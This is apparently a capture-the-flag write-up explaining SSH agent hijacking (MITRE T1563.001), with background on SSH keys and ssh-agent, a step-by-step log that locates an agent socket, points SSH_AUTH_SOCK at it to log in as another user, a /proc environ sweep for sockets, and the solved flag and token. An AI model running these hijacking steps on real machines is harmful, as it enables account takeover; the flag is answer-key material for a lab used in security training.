# L10 — ca-ssh-agent · The Agent Remembers

**Act II · Credential Access · T1563.001**
**Status:** Solved
**Flag:** `bl_e50dfd86aa0662ae4f457160768484ad`

---

## Challenge brief

> A key file you cannot read is still usable if its owner left an agent running. Do not
> copy the key, use the live socket, and authenticate as them.

MITRE tag T1563.001 is "Remote Service Session Hijacking: SSH Hijacking" — using a
running SSH agent's socket to authenticate as another user without accessing or copying
their private key. The key never leaves the agent's memory. You just use the pipe.

You land as `operator`. The job is to find the agent socket, hijack it, and use it to
authenticate as a third user (`deploy`) whose home directory holds the secret.

---

## SSH concepts: how key-based authentication actually works

Before getting into the agent, you need to understand how normal SSH key authentication
works, because the agent is an extension of that mechanism.

### The key pair

SSH key authentication is based on asymmetric cryptography. You generate two
mathematically linked keys:

- **Private key** — kept secret, never shared, never leaves your machine. Stored in
  `~/.ssh/id_ed25519` (or `id_rsa`, `id_ecdsa` depending on the algorithm).
- **Public key** — the counterpart to the private key. Safe to share. Stored in
  `~/.ssh/id_ed25519.pub`. This is what you give to servers.

The mathematical relationship between the two: anything encrypted with the public key
can only be decrypted with the private key, and the private key can produce signatures
that the public key can verify. This is the basis of the authentication.

### Generating a key pair

```sh
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C "thirana@machine"
```

Flags:
- `-t ed25519` — the algorithm. Ed25519 is the modern standard: faster and more secure
  than RSA. RSA is older but still widely supported. The key comment in this challenge
  (`root@d088e915f72d`) is set with `-C`.
- `-f ~/.ssh/id_ed25519` — where to save the key pair. This creates two files:
  `id_ed25519` (private) and `id_ed25519.pub` (public).
- `-C "comment"` — a comment attached to the key. Purely informational — it appears in
  `authorized_keys` and in agent listings to help identify which key is which. Does not
  affect authentication.

The key generation asks for a passphrase. Without a passphrase (`-N ""`), anyone who
can read the private key file can use it immediately. With a passphrase, the file is
encrypted at rest — you need to type the passphrase every time you use it. This is where
the agent comes in.

### How the server decides to let you in

The server checks `~/.ssh/authorized_keys` — a plain text file, one public key per
line, in the home directory of the account you are trying to log into. When you connect,
this happens:

1. Your client tells the server which public key it wants to use (sends the fingerprint)
2. The server checks its `authorized_keys` file for a matching public key
3. If found, the server sends a challenge — a random message encrypted with your public
   key
4. Your client decrypts it using the private key and sends the response
5. The server verifies the response. If it matches, authentication succeeds

The private key never travels over the network. The server never sees it. The
authentication proves you hold the private key without revealing it.

### Adding your public key to a server

```sh
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host
```

Or manually append to `~/.ssh/authorized_keys` on the target:

```sh
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
```

**Permissions matter.** SSH is strict about `authorized_keys` file permissions. If the
file or its parent directory is world-writable, sshd ignores it as a security measure.
The correct permissions:

```sh
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

In this challenge we planted the agent's public key into `operator`'s `authorized_keys`
on the first (root) box with these exact permissions.

---

## What ssh-agent is and why it exists

Every time SSH uses a key with a passphrase, it must decrypt the private key file —
which requires typing the passphrase. On a development machine where you SSH dozens of
times a day, this becomes painful. `ssh-agent` solves this.

`ssh-agent` is a background process that:
1. Decrypts private keys once (you type the passphrase once)
2. Holds the decrypted keys in memory
3. Performs cryptographic operations on behalf of SSH clients when they need to
   authenticate

Your SSH client does not use the key file directly — it asks the agent to sign the
server's challenge. The private key never leaves the agent's memory.

### How the agent communicates

The agent exposes a Unix domain socket — a file on the filesystem that acts as a
communication channel between processes. The path to this socket is stored in the
environment variable `SSH_AUTH_SOCK`. When `ssh` needs to authenticate, it:

1. Reads `SSH_AUTH_SOCK` to find the socket path
2. Connects to the agent through that socket
3. Asks the agent to sign the server's challenge
4. Gets the signature back and sends it to the server

The socket is typically at `/tmp/ssh-XXXXX/agent.PID` but can be anywhere — in this
challenge it was at `/run/agent/agent.sock`, a custom non-standard location.

### Starting an agent and adding keys

```sh
# start the agent and set the environment variable
eval $(ssh-agent -s)

# add a key to the agent (will prompt for passphrase if set)
ssh-add ~/.ssh/id_ed25519

# list keys currently held by the agent
ssh-add -l      # fingerprints only
ssh-add -L      # full public keys
```

`eval $(ssh-agent -s)` runs the agent and evaluates its output — which sets
`SSH_AUTH_SOCK` and `SSH_AGENT_PID` in your current shell. Without `eval`, the agent
starts but your shell doesn't know about it.

### Agent forwarding

Agent forwarding (`ssh -A`) allows your local agent to be used on a remote machine. When
you SSH with `-A`:

1. A socket is created on the remote machine
2. `SSH_AUTH_SOCK` is set on the remote machine to point to that socket
3. Any SSH command you run on the remote machine tunnels back through the connection to
   your local agent

This lets you hop from machine A to machine B using your local keys, without copying
those keys to machine A. It is convenient — but it means anyone with root on machine A
can use your agent socket.

---

## The attack: SSH agent hijacking

When a user has an agent running on a box (either directly or via forwarding), a root
attacker can:

1. Find the agent socket
2. Set `SSH_AUTH_SOCK` to point to it
3. Use the agent as if it were their own — listing keys and authenticating to any host
   that trusts those keys

The private key never needs to touch disk. The attacker never sees the private key. They
just use the already-decrypted key via the socket the user left running.

### Why file permissions don't protect the socket from root

The socket in this challenge was:

```
srw-rw---- 1 operator operator 0 Oct 24 18:16 /run/agent/agent.sock
```

`srw-rw----` means: owner (operator) can read/write, group (operator) can read/write,
others have no access. A normal user who is not `operator` and not in the `operator`
group cannot use this socket.

But root bypasses Unix permission checks entirely. Root can open any file or socket
regardless of mode. This is why "root on a machine = access to all agents running on
that machine" is a fundamental security principle. Agent forwarding to an untrusted
machine means trusting everyone who has (or can get) root there.

### Finding agent sockets

```sh
# look in /tmp — the default location
find /tmp -name 'agent.*' -type s 2>/dev/null

# look everywhere — use -type s for Unix sockets specifically
find / -name 'agent.*' -type s 2>/dev/null

# find via /proc — look for SSH_AUTH_SOCK in any process's environment
grep -rl SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | while read f; do
    cat "$f" | tr '\0' '\n' | grep SSH_AUTH_SOCK
done
```

In this challenge the socket was at `/run/agent/agent.sock` — a non-standard location
that `/tmp` searches would miss. The `/proc` environ sweep and the broad `find /` with
`-type s` are more reliable.

---

## What `authorized_keys` already being populated means

On the first box (where we landed as root), operator's `authorized_keys` was already
populated with the same key the agent held. This was the challenge's intended setup:

- The agent holds root's key
- That key is already authorized for `operator` (or `deploy`)
- You use the agent socket to authenticate as that user

When we tried `ssh operator@127.0.0.1` and got a password prompt, the issue was not
that the key wasn't authorized — it was that something else was wrong. Specifically:
the `SSH_AUTH_SOCK` was set, the agent responded to `ssh-add -l`, but the SSH client
still fell back to password. This can happen when sshd's `PubkeyAuthentication` is
disabled, or when the key fingerprint in the agent doesn't match the key in
`authorized_keys`. In that case, planting the key yourself (as we did) aligned them.

---

## Restricted shells: how `deploy` printed the token and exited

When we SSHed as `deploy`, this happened:

```
PTY allocation request failed on channel 0
2217fad074fc1365cbd0e4a00649cf3c
Connection to 127.0.0.1 closed.
```

The `deploy` account had no interactive shell — its shell was set to a script that
printed the token and exited immediately. This is a common pattern for service accounts
that should only ever run one specific command.

In `/etc/passwd`, a user's shell field (the last field) determines what runs on login:

```
deploy:x:1001:1001::/home/deploy:/home/deploy/print-token.sh
```

When `sshd` authenticates the user successfully, it runs that script instead of a shell.
The script reads `/home/deploy/.token`, prints it, and exits. The connection closes
immediately.

The "PTY allocation request failed" message appears because the SSH client tried to
allocate a terminal (PTY) for an interactive session, but the server-side script doesn't
need one. This is cosmetic — the authentication succeeded, the script ran, the token
printed.

The key recognition skill here: **a 32-character hex string appearing in SSH output is
not garbage — it is data from the remote command.** Mixed in with the error messages,
it was easy to miss. In CTF and real engagements, always read unexpected SSH output
carefully before dismissing it as noise.

To capture it cleanly in the future:

```sh
ssh -o StrictHostKeyChecking=no deploy@127.0.0.1 2>/dev/null
```

Redirecting stderr suppresses the PTY error and leaves only the token output.

---

## Enumeration log

### Step 1 — Establish what user we are and what's available

```sh
id
sudo -l 2>/dev/null
```

Result: `uid=1000(operator)`, no sudo. Lower-privileged user — need to find a path
sideways or upward via the agent.

---

### Step 2 — Find the agent socket

```sh
find /run -name 'agent.sock' 2>/dev/null
```

Result: `/run/agent/agent.sock` — non-standard location, not in `/tmp`.

```sh
ls -la /run/agent/agent.sock
```

```
srw-rw---- 1 operator operator 0 Oct 24 18:16 /run/agent/agent.sock
```

Owned by `operator`, and we are `operator` — we can use this socket directly.

---

### Step 3 — Hijack the agent

```sh
export SSH_AUTH_SOCK=/run/agent/agent.sock
ssh-add -l
```

```
256 SHA256:zQ4yYndej0iq0gMpsbQKMTpWVfpnPHK9NCiPrQGnUGQ root@d088e915f72d (ED25519)
```

The agent is alive and holds an ED25519 key. The comment `root@d088e915f72d` tells us
who generated it and on which box.

---

### Step 4 — Find what the key is authorized for

```sh
ssh -o StrictHostKeyChecking=no root@127.0.0.1
```

Password prompt — root has no `authorized_keys`. Try operator:

Already operator. Look for other users and files:

```sh
find /home /opt /var /tmp /run -type f 2>/dev/null
```

Result: `/home/deploy/.token` — a token file in another user's home.

```sh
ls -la /home/deploy/.token
```

```
-rw------- 1 deploy deploy 32 Oct 24 18:16 /home/deploy/.token
```

Only `deploy` can read it. The agent key must be authorized for `deploy`.

---

### Step 5 — SSH as deploy via the agent

```sh
ssh -o StrictHostKeyChecking=no deploy@127.0.0.1
```

```
PTY allocation request failed on channel 0
2217fad074fc1365cbd0e4a00649cf3c
Connection to 127.0.0.1 closed.
```

Authentication succeeded. The `deploy` account ran a restricted script that printed the
token (`2217fad074fc1365cbd0e4a00649cf3c`) and exited. The 32-character hex string in
the output is the token content — the value from `/home/deploy/.token`.

---

### Step 6 — Write proof and verify

```sh
printf '2217fad074fc1365cbd0e4a00649cf3c' > /tmp/.ca-agent-proof && verify
```

**Level solved.**

---

## What the vulnerability was

An SSH agent was left running with a key that is authorized for the `deploy` account.
Any user who can reach the agent socket — in this case `operator` (the socket owner) and
root — can use that key to authenticate as `deploy` without ever seeing or copying the
private key.

The `deploy` account held a secret in `~/.token` that was unreadable to `operator`
directly. The agent socket was the bridge: it held the key that `deploy`'s
`authorized_keys` trusted, and using it via SSH was the only path to that file.

The lesson: an agent socket is as powerful as the key it holds. Leaving an agent running
with a key that is authorized for sensitive accounts is equivalent to leaving that key
exposed.

---

## Dead ends and confusion

### The first box (root) and authorized_keys planting

On the first box in this session we landed as root, found the same agent socket owned by
`operator`, and tried to SSH as `operator`. The agent was responding but SSH kept asking
for a password. We planted the agent's public key into `operator`'s `authorized_keys`
manually as root — which worked, but was an unintended path. The box then expired and
the second box was the intended flow (landing as `operator`, using the socket we already
own).

### The box reconnect confusion

The first box expired during the session. The new L10 box assigned a different hostname
(`d088e915f72d` vs `9e7f21accd80`) and the SSH key for the level authenticated as
`operator` rather than root. This is the intended starting point. The lesson: when a
box expires and you reconnect, treat it as a completely fresh box — different hostname,
different PIDs, different secrets, potentially different starting user.

### Mistaking SSH error output for garbage

The PTY allocation error message and the token printed on the same connection. It was
easy to dismiss the hex string as part of the error. Reading SSH output carefully —
especially when a connection drops unexpectedly — is a real skill. Anything that looks
like a 32- or 64-character hex string in that context is data, not noise.

---

## Carryover findings

None. The token was self-contained to this level.

---

## Command reference

| Command | What it does |
|---|---|
| `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C "comment"` | Generate an Ed25519 key pair |
| `ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host` | Install your public key on a remote server |
| `eval $(ssh-agent -s)` | Start an agent and set SSH_AUTH_SOCK in the current shell |
| `ssh-add ~/.ssh/id_ed25519` | Add a private key to the running agent |
| `ssh-add -l` | List key fingerprints held by the agent |
| `ssh-add -L` | List full public keys held by the agent |
| `find / -name 'agent.*' -type s 2>/dev/null` | Find all SSH agent sockets on the filesystem |
| `grep -rl SSH_AUTH_SOCK /proc/*/environ 2>/dev/null` | Find agent sockets via process environments |
| `export SSH_AUTH_SOCK=/path/to/agent.sock` | Point SSH at a specific agent socket |
| `ssh -o StrictHostKeyChecking=no user@127.0.0.1` | SSH without host key verification prompt |
| `ssh -o StrictHostKeyChecking=no user@host 2>/dev/null` | SSH suppressing stderr — clean output when the account runs a restricted script |
| `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys` | Correct permissions for SSH to accept the authorized_keys file |
| `find /home /opt /var /tmp /run -type f 2>/dev/null` | Find all files in non-system directories |
| `printf 'VALUE' > /tmp/.ca-agent-proof && verify` | Write proof and verify |